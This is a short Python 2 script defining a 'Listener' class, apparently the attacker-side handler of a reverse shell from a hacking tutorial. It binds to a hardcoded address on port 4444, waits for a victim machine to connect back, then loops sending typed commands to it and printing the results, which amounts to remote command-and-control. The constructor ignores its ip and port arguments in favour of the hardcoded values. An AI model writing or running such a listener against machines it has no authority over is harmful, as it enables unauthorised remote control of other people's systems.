import socket
class Listener:
    def __init__(self,ip,port):

        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("172.17.221.67",4444))   
        listener.listen(0)                    
        print("[+] Waiting for incoming connection")
        self.connection,address=listener.accept()                     
        print("[+] Got a connection from"+str(address))
    def execute_remotely(self,command):
        self.connection.send(command)
        return self.connection.recv(1024)
    def run(self):
        while True:
             command=raw_input(">> ")
             result=self.execute_remotely(command)
             print(result)
